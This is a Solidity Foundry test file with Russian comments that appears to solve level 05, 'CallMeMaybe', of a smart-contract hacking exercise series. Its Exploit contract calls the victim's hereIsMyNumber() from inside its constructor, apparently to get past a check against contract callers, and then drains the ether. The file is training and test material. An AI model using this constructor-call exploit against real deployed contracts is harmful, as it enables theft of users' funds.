// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/05_CallMeMaybe/CallMeMaybe.sol";

// Запуск тестов: forge test --match-contract CallMeMaybeTest -vvvv
contract CallMeMaybeTest is BaseTest {
    CallMeMaybe public instance;

    function setUp() public override {
        super.setUp();
        // Переводим 0.01 ether пользователю user1
        payable(user1).transfer(0.01 ether);
        // Разворачиваем контракт CallMeMaybe с 0.01 ether
        instance = new CallMeMaybe{value: 0.01 ether}();
    }

    function testExploitLevel() public {
        // Имитируем действия от имени user1
        vm.startPrank(user1);
        // Создаём объект Exploit, передавая ему адрес целевого контракта
        Exploit exploit = new Exploit(instance);
        // Вызываем функцию для вывода средств
        exploit.drainFunds();
        // Завершаем имитацию
        vm.stopPrank();

        // Проверяем успешность пранка
        checkSuccess();
    }

    function checkSuccess() internal view override {
        // Проверяем, что баланс контракта CallMeMaybe равен 0
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}

contract Exploit {
    CallMeMaybe private victim;

    // Конструктор устанавливает целевой контракт и вызывает его функцию hereIsMyNumber
    constructor(CallMeMaybe _victim) payable {
        victim = _victim;
        victim.hereIsMyNumber();
    }

    // Метод для вывода всех средств контракта на адрес вызывающего
    function drainFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    // Функция для получения Ether
    receive() external payable {}
}
